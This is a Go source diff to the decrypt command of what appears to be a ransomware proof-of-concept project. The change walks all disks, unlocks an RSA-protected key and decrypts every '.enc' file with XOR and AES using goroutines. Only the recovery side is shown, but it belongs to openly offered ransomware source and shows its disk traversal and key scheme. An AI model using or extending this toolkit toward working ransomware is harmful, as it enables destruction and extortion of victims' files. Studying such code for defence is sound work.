@@ -1,9 +1,12 @@
 package cmd
 
 import (
-	"davidlares/ransomware/decrypt"
-	"davidlares/ransomware/mapper"
-	"davidlares/ransomware/rsa"
+	"davidlares/golang-ransomware-poc/decrypt"
+	"davidlares/golang-ransomware-poc/mapper"
+	"davidlares/golang-ransomware-poc/rsa"
+	"fmt"
+
+	"strings"
 
 	"github.com/spf13/cobra"
 )
@@ -16,18 +19,30 @@ var decryptCmd = &cobra.Command{
 		// control
 		decryptControl := make(chan struct{}, 10)
 		// disks listing
-		disk := mapper.ListingDisks()
+		disks := mapper.ListingDisks()
 		// decrypting RSA key
 		rsa.RSADecryptionWithAES("private.pem")
 		// looping
-		for _, disk := range disk {
-			files := mapper.MapFiles(disk, []string{".pdf", ".efi"})
+		for _, disk := range disks {
+			// getting files
+			files := mapper.MapFiles(disk, nil) // no file distinction (free now)
+			// looping files
 			for _, file := range files {
-				// adding to waitgroup
-				mapper.Wg.Add(1)
-				// decrypt control
-				decryptControl <- struct{}{}
-				go decrypt.DecryptWithXorAndAES(file, "aes_key.txt", decryptControl)
+				if strings.HasSuffix(file, ".enc") {
+					// adding to waitgroup
+					mapper.Wg.Add(1)
+					// decrypt control
+					decryptControl <- struct{}{}
+					go func(file string) {
+						defer mapper.Wg.Done()
+						defer func() { <-decryptControl }()
+						// enc
+						err := decrypt.DecryptWithXorAndAES(file, "aes_key.txt")
+						if err != nil {
+							fmt.Println("Error in decryption", file)
+						}
+					}(file)
+				}
 			}
 		}
 		mapper.Wg.Wait()
